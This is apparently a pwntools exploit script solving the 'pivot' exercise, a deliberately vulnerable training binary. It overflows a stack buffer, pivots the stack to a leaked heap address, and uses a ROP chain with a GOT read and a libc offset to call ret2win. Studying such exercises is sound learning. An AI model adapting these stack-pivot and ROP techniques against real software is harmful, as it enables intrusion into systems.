from pwn import *

elf = ELF('./pivot')
libc = ELF('./libpivot.so')
io = elf.process()

raw_input("zr3333?")

io.recvuntil(b"pivot: ")
leak = int(io.recvline(), 16)
info(f"leak: {hex(leak)}")


io.recvuntil(b"> ")

heap = b""
heap += p64(elf.plt['foothold_function'])
heap += p64(0x00000000004009bb) # : pop rax ; ret
heap += p64(elf.got['foothold_function'])
heap += p64(0x00000000004009c0) # : mov rax, qword ptr [rax] ; ret
heap += p64(0x00000000004007c8) # : pop rbp ; ret
heap += p64(libc.sym['ret2win'] - libc.sym['foothold_function'])
heap += p64(0x00000000004009c4) # : add rax, rbp ; ret
heap += p64(0x00000000004006b0) # : call rax

io.sendline(heap)
#-----------------------------------------------
io.recvuntil(b"> ")

stack = b""
stack += b"A" * 40
stack += p64(0x00000000004009bb) # : pop rax ; ret
stack += p64(leak)
stack += p64(0x00000000004009bd) # : xchg rsp, rax ; ret

io.sendline(stack)

io.interactive()
